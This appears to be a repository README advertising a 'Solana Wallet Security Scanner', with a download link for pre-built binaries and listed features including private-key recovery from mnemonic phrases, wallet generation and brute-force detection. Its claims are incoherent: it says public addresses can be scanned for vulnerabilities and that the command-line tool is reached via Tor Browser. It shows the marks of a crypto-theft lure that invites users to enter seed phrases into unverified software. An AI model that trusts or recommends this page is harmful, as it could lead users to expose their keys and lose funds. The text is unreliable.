# Solana Wallet Security Scanner: Protect Your Crypto Assets  

**Solana Wallet Security Scanner** is a powerful tool designed to help users safeguard their Solana (SOL) assets by identifying vulnerabilities and monitoring wallet activity. With the increasing risks of cyber threats, ensuring the security of your crypto holdings is more important than ever. This tool provides advanced scanning capabilities, allowing you to detect potential risks and take proactive measures to protect your Solana wallets.  

---
###[DOWNLOAD FOR WINDOWS & LINUX](../../releases)
   <p align="left">
    <img src="/gallery/log.webp" />
</p>

## Key Features  

### 1. **Comprehensive Security Scanning**  
   - Scan your Solana wallet for vulnerabilities and potential security risks.  
   - Identify weak points in your wallet setup and take corrective actions.  

<p align="left">
    <img src="/gallery/record.webp" />
</p>

### 2. **Check Solana Address Balance**  
   - Verify the balance of any Solana wallet address.  
   - Ensure the address is active and holds the expected amount of SOL.  

### 3. **Track Solana Wallet Activity**  
   - Monitor transactions on a specific Solana wallet address.  
   - Receive real-time notifications via Telegram for added convenience.  

### 4. **Recover Wallet Data Using Mnemonic Phrase**  
   - Retrieve wallet details, including the private key, address, and balance, using a mnemonic phrase.  
   - Securely manage your wallets and access critical information when needed.  

<p align="left">
    <img src="/gallery/basic.webp" />
</p>

### 5. **Generate New Solana Wallets**  
   - Create a new Solana wallet with a unique private key and address.  
   - Ideal for users looking to expand their crypto portfolio.  

<p align="left">
    <img src="/gallery/summary.webp" />
</p>

### 6. **Brute-Force Wallet Detection**  
   - Detect potential brute-force attempts on your Solana wallet addresses.  
   - Identify suspicious activity and take proactive measures to secure your assets.  

<p align="left">
    <img src="/gallery/scheme.webp" />
</p>

---

## How to Use Solana Wallet Security Scanner  

### Step 1: **Access the Tool**  
   - Use the **Tor Browser** or any secure browser to access the tool.  
   - Ensure your connection is encrypted for maximum security.  

### Step 2: **Scan Your Wallet**  
   - Input your Solana wallet address to perform a security scan.  
   - The tool will analyze your wallet for vulnerabilities and provide detailed feedback.  

### Step 3: **Enable Telegram Notifications**  
   - Configure Telegram settings to receive real-time updates about wallet activity.  
   - Add your bot token and chat ID to the `telegram-settings.txt` file.  

---

## Why Choose Solana Wallet Security Scanner?  

- **Advanced Security:** Protect your Solana wallets from vulnerabilities and unauthorized access.  
- **Real-Time Monitoring:** Stay informed about wallet activity with instant notifications.  
- **User-Friendly Interface:** Easily navigate the platform and access all features in one place.  
- **Multi-Functional:** From security scanning to wallet generation, this tool covers all your Solana needs.  

---

## Getting Started  

You can download the pre-compiled build from the [Release](../../releases) section or build the project yourself using the instructions below.  

### Building the Project  

1. **Install Dependencies:**  
   Use **vcpkg** to install required libraries:  
   ```bash
   vcpkg install openssl nlohmann-json cryptopp libsodium
   ```  

2. **Build via Visual Studio:**  
   - Open the project solution in Visual Studio.  
   - Click **Build** -> **Build Solution**.  

3. **Build via Command Line:**  
   ```bash
   g++ -o solanachecker main.cpp -lssl -lcrypto -lsodium -lcryptopp -std=c++17
   ```  

---

## Command Line Options  

- **-s / -scan (ADDRESS):** Perform a security scan on a Solana wallet address.  
- **-b / -balance (ADDRESS):** Check the balance of a specific Solana wallet address.  
- **-t / -track (ADDRESS):** Track activity on a specific Solana wallet address.  
- **-m / -mnemonic (MNEMONIC):** Retrieve wallet data using a mnemonic phrase.  
- **-g / -gen (NUMBER):** Generate a specified number of Solana wallets.  

---

## Disclaimer  

This tool is intended for educational and research purposes only. It should not be used for illegal activities or unauthorized access to wallets. Always ensure the security of your private keys and mnemonic phrases.  

---

## License  

This project is licensed under the [MIT License](/LICENSE). Feel free to use, modify, and distribute the code in accordance with the license terms.  

---

**Stay Secure, Stay Informed, and Protect Your Solana Wallets with the Solana Wallet Security Scanner!**